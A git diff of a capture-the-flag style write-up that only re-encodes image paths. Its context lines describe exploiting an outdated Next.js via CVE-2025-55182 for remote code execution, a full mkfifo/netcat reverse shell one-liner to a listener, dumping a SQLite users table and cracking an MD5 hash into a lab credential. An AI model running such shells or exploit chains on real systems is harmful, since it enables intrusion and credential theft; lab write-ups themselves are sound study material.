@@ -45,7 +45,7 @@ including `X-Powered-By: Next.js`.
 
 ## HTTP (3000)
 
-![image description](/assets/image (20).png)
+![image description](/assets/image%20(20).png)
 
 Wappalyzer flagged an outdated Next.js version, which pointed me straight 
 to **CVE-2025-55182** — a Server-Side Request Forgery / RCE chain affecting 
@@ -119,7 +119,7 @@ Content-Disposition: form-data; name="2"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
-![image description](/assets/image (21).png)
+![image description](/assets/image%20(21).png)
 
 RCE confirmed. I swapped `ls` for a reverse shell payload and caught it on 
 my listener.
@@ -129,7 +129,7 @@ my listener.
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.251 1337 >/tmp/f
 ```
 
-![image description](/assets/image (22).png)
+![image description](/assets/image%20(22).png)
 
 ### Database Credentials
 
@@ -145,7 +145,7 @@ sqlite> select * from users;
 Two MD5 hashes. I took both to Crackstation. The admin hash didn't crack, 
 but `engineer` did.
 
-![image description](/assets/image (23).png)
+![image description](/assets/image%20(23).png)
 
 **engineer : reactor1**
 
